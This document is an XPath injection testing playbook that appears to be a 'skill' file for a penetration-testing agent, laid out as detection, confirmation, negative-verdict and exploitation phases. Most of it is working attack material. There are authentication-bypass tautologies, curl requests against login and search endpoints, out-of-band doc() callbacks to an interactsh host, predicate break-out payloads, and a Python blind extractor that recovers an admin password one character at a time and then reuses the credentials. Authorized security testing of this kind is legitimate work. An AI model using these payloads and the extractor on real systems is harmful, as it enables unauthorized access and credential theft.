# XPath Injection — Vulnerability Skill

**Phase:** 3 | **Skill Type:** Testing | **Impact:** Critical | **Prerequisite:** Endpoint mapped (Phase 2), XML-based data store suspected (XML config files, legacy XML backends, SOAP-ish query params)

---

## Mental Model

XPath is the query language for XML documents — the same idea as SQL for databases, but the "table" is an XML tree and there's no native authentication or privilege separation inside the document. XPath injection is *classic* boolean/error injection, but against `//user[username='...']` instead of `WHERE username='...'`.

**The core assumption you're violating:** "The query string I interpolate is trusted data, not code." Developers who still use XPath (legacy auth systems, XML-driven config apps, some SOAP/xml-rpc services, JIRA-era plugins) usually escaped quotes but never thought of the query *operators*.

**Why it's still worth hunting:**
- XPath 1.0 has **no comment syntax** — you can't just `--` your way out. You must build logically-closing payloads.
- Blind extraction is deterministic and fast: `string-length()`, `substring()`, `contains()`, `count()`.
- The whole document is readable — there is no column/table separation, so *everything* (including admin passwords, API keys, config) is one query away.
- Auth-bypass payloads are short and high-signal.

**The two injection styles:**
1. **Inline (string context)** — input goes inside quotes: `' or '1'='1`
2. **Predicate/query context** — input is a full predicate: `] | //*[contains(.,'admin')] | //*[`

**Blind differential is the bread-and-butter:** response difference between a payload evaluating `true` vs `false` lets you extract any node character by character.

---

## Phase 1: OOB-First Detection (MANDATORY)

Standard XPath 1.0 cannot reach out-of-band. But if the backend is an XML engine that supports XQuery or extension functions (eXist-db, BaseX, .NET `System.Xml.XPath` with XSLT context, MarkLogic), you can sometimes trigger external fetches — test it once, it's free:

```bash
./tools/interactsh_launcher.sh start --output-dir engagement/oob/
OOB_URL=$(cat engagement/oob/oob_url.txt)
```

```bash
# XQuery document() — external doc fetch (SSRF-ish OOB)
curl "https://target.com/search?user=admin'+and+doc('http://$OOB_URL/xq')+and+'1'='1"

# XSLT document() if the app runs transforms
curl "https://target.com/search?user=admin'+and+document('http://$OOB_URL/xsl')+and+'1'='1"

# fn:resolve-uri based fetch (MarkLogic)
curl "https://target.com/search?user=admin'+and+fn:doc('http://$OOB_URL/ml')+and+'1'='1"
```

```bash
./tools/interactsh_launcher.sh poll --output-dir engagement/oob/ --timeout 30
```

Callback → OOB-capable engine, massive impact. Otherwise proceed to boolean-based confirmation — OOB not being available is expected and does NOT mean negative.

---

## Phase 2: Confirmation

### 2.1 Authentication Bypass (Inline)

On login/search endpoints where input sits inside a quoted XPath predicate:

```bash
# Classic tautology (never use -- ; XPath has no comments)
' or '1'='1
' or '1'='1' or '
' or 'a'='a
" or "1"="1
' or 1=1 or ''='
' or 1=1 or 'x'='y
' or '1'='1' and '1'='1
```

```bash
curl -X POST https://target.com/login -d "username='%20or%20'1'='1&password=x"
curl -X POST https://target.com/login -d "username=admin'%20or%20'1'='1&password=x"
```

If a non-existent user logs in successfully → XPath injection confirmed.

### 2.2 Blind Differential (Primary Method)

If the response doesn't change on `' or '1'='1`, go boolean:

```bash
# TRUE condition (baseline)
user=admin'+and+'1'='1
# FALSE condition
user=admin'+and+'1'='2
```

Different status/length/content between the two → boolean oracle confirmed. Compare with `python3 tools/response_diff.py`.

### 2.3 Data Extraction (Blind)

With the oracle working, extract node-by-node:

```bash
# Is the password field non-empty?
user=admin'+and+string-length(//user[username='admin']/password)>0+and+'1'='1

# First char of password
user=admin'+and+substring(//user[username='admin']/password,1,1)='a'+and+'1'='1

# Count users (document enumeration)
user=admin'+and+count(//user)=5+and+'1'='1
```

### 2.4 Full-Query Injection (Predicate Context)

When the app lets you reach the predicate position (often after breaking out of a node test):

```bash
# Break out and read everything
'] | //* | //*[
'] | //user[contains(.,'admin')] | //user[
] | //user[name='admin']/password | //x[
' or name()='user' and contains(.,'admin') or '
```

---

## Phase 3: Negative Verdict (MANDATORY GATE)

**DO NOT declare XPath injection negative without:**

1. Testing **both** injection contexts — inline string (`' or '1'='1`) AND predicate (`] | //*[`)
2. Testing single-quote AND double-quote variants
3. Confirming a clean boolean differential — `'1'='1` vs `'1'='2` must produce a stable, reproducible response difference (retest 3x with `response_diff.py`)
4. Checking `string-length()>0`, `count()`, and `substring()` oracles, not just tautology
5. Testing on every parameter that plausibly feeds an XML query (search, login, lookup, filter)
6. Confirming the app is actually XML/XPath-backed — if the same payloads produce identical responses to a SQL backend, this is a *wrong-skill* negative, not a true negative

If no oracle and no tautology on any parameter → NEGATIVE.

---

## Phase 4: Exploitation

### 4.1 Full Document Dump (Blind Extractor)

```python
import requests, string, urllib.parse

target = "https://target.com/search"
charset = string.ascii_letters + string.digits + "@!#$%^&*()_+-=.:;"

def oracle_true(user):
    r = requests.get(target, params={"user": user})
    return "result" in r.text  # replace with the app's true/false signal

# Enumerate admin password
def extract(xpath_expr):
    out = ""
    while True:
        hit = False
        for c in charset:
            p = f"admin' and substring({xpath_expr},1,{len(out)+1})='{out+c}' and '1'='1"
            if oracle_true(p):
                out += c; hit = True
                print(f"  {out}")
                break
        if not hit:
            break
    return out

print("password:", extract("//user[username='admin']/password"))
```

### 4.2 Impact Escalation
1. Extract admin credentials from the XML store
2. Look for config nodes: API keys, database connection strings, internal hostnames
3. Reuse credentials against the app's real login

**Stop condition:** First confirmed credential/config extraction. Document and stop — do not further chain into production systems.

---

## What You DO
- Use logical-closing payloads — XPath has NO comment syntax, `--` won't work
- Establish a clean boolean oracle (`'1'='1` vs `'1'='2`) before extracting anything
- Test both quote styles and both injection contexts (inline + predicate)
- Use `string-length`, `substring`, `count` for deterministic blind extraction
- Run `response_diff.py` on every true/false pair to catch subtle signals

## What You DO NOT Do
- Use SQLi payloads or `sqlmap` — this is a different query language
- Declare negative because `' or 1=1` didn't work — try the predicate `] | //*[` context and boolean oracles first
- Assume XPath is gone from the modern web — it's rare but that rarity means high-impact when found
- Try to extract the entire document when a single admin credential proves the point
- Ignore the XML-vs-SQL distinction — a confirmed SQLi against the same param is not an XPath finding

---

## Cross-Skill Links
- [[xxe]] — If the app parses XML, test XXE on the same endpoints
- [[sqli]] — Same boolean/error methodology, different language; don't cross-contaminate payloads
- [[ldap-injection]] — Structurally similar quoted-filter injection with `*` wildcards
